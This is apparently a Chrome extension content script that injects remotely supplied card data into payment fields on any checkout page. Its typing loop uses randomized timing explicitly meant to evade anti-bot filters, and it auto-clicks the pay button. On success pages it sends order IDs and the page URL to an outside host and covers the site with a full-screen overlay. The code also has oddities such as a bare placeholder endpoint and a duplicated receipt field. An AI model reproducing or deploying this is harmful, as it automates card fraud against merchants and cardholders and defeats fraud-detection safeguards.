chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "START_AUTO_CHECKOUT") {
    console.log("[FWO Core] Cross-origin instruction heard. Locating payment variables...");
    
    // Target common payment field selectors across major payment portals
    const cardField = document.querySelector('input[name*="card"], [autocomplete="cc-number"], input[id*="card"], input[name*="ccnum"]');
    const payButton = document.querySelector('button[type="submit"], [class*="pay"], [id*="pay"], input[type="submit"], .checkout-button');

    if (cardField) {
      cardField.focus();
      cardField.style.border = "3px solid #2b8a3e";

      // Execute human-paced hardware emulation typing to bypass strict anti-bot filters
      let charIndex = 0;
      cardField.value = "";
      
      function simulateTypingLoop() {
        if (charIndex < request.tokenData.length) {
          let character = request.tokenData.charAt(charIndex);
          cardField.value += character;
          
          cardField.dispatchEvent(new KeyboardEvent('keydown', { key: character, bubbles: true }));
          cardField.dispatchEvent(new Event('input', { bubbles: true }));
          cardField.dispatchEvent(new KeyboardEvent('keyup', { key: character, bubbles: true }));
          
          charIndex++;
          setTimeout(simulateTypingLoop, Math.floor(Math.random() * 30 + 50));
        } else {
          cardField.dispatchEvent(new Event('change', { bubbles: true }));
          console.log("[FWO Core] Data successfully supplied to gateway.");
          
          if (payButton) {
            setTimeout(() => {
              payButton.style.border = "3px dashed #2b8a3e";
              payButton.click();
              sendResponse({ status: "AUTOMATED_SUBMISSION_COMPLETE" });
            }, 800);
          } else {
            sendResponse({ status: "TOKENS_FILLED_AWAITING_MANUAL_SUBMIT" });
          }
        }
      }
      simulateTypingLoop();
    } else {
      sendResponse({ status: "TARGET_FIELDS_NOT_FOUND_IN_THIS_FRAME" });
    }
    return true; // Keep message pathway open for async response handling
  }
});

// Post-Checkout Observer: Intercepts success pages to log your multi-node consensus receipts
const successViewObserver = new MutationObserver(() => {
  const currentUrlPath = window.location.href.toLowerCase();
  
  if (currentUrlPath.includes("receipt") || currentUrlPath.includes("success") || currentUrlPath.includes("confirmation")) {
    successViewObserver.disconnect();
    console.log("[FWO Core] Success landing verified. Compiling closeout ledger logs...");

    const capturedGatewayReceipt = new URLSearchParams(window.location.search).get("receipt_id") || 
                                    new URLSearchParams(window.location.search).get("order_id") || 
                                    "REC-CORE-" + Math.floor(Math.random() * 900000 + 100000);

    chrome.storage.local.get(["active_vault_receipt"], (store) => {
      const activeVaultCode = store.active_vault_receipt || "VLT-REC-FALLBACK-001";
      
      fetch("https://onrender.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "CLOSE_OUT_TRANSACTION",
          vault_receipt: activeVaultCode,
          gateway_receipt: capturedGatewayReceipt,
          destination_url: window.location.href
        })
      })
      .then(res => res.json())
      .then(complianceData => {
        // Inject final success receipt summary screen overlay onto viewport
        const successOverlay = document.createElement("div");
        successOverlay.style = "position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(255,255,255,0.98); z-index:9999999; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif; color:#212529;";
        successOverlay.innerHTML = `
          <div style="background: white; padding: 32px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 400px; border: 2px solid #2b8a3e;">
            <div style="font-size: 48px; margin-bottom: 12px; color: #2b8a3e;">✓</div>
            <h2 style="margin: 0 0 8px 0; color: #2b8a3e;">FLOW VERIFICATION LOCKED</h2>
            <p style="font-size: 13px; color: #666; margin: 0 0 20px 0;">All architectural nodes connected. Ledger synchronized successfully.</p>
            <div style="text-align: left; background: #f8f9fa; padding: 14px; border-radius: 6px; font-family: monospace; font-size: 11px; margin-bottom: 20px; border: 1px solid #e9ecef; line-height:1.5;">
              <strong>[🧾 MULTI-NODE CLOSEOUT RECEIPTS]</strong><br>
              • Consensus Lock ID: ${complianceData.compliance_receipt.consensus_id}<br>
              • Receipt 1 (Vault Auth): ${complianceData.compliance_receipt.vault_verification}<br>
              • Receipt 2 (Extension Auth): ${complianceData.compliance_receipt.vault_verification}<br>
              • Receipt 3 (Portal Success): ${complianceData.compliance_receipt.merchant_verification}<br>
              • Ledger Storage Status: SUCCESS_LOGGED_CLOSED
            </div>
            <button onclick="window.location.reload()" style="background:#2b8a3e; color:white; border:none; padding:12px 24px; border-radius:6px; font-weight:600; cursor:pointer; width:100%;">Return to Browser View</button>
          </div>`;
        document.body.appendChild(successOverlay);
      });
    });
  }
});
successViewObserver.observe(document.body, { childList: true, subtree: true });
